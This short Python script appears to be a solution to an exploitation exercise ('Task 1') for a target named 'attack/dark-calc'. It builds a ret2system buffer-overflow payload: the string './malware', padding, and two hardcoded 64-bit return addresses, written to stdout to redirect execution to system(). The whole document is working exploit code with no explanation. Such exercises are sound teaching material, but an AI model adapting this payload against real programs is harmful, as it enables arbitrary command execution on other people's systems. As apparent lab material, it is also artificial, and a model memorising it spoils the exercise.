#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc (ret2system)."""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

payload = b"./malware\x00" + b"B" * 14
payload += p64(0x401786)
payload += p64(0x4017E0)

sys.stdout.buffer.write(payload)
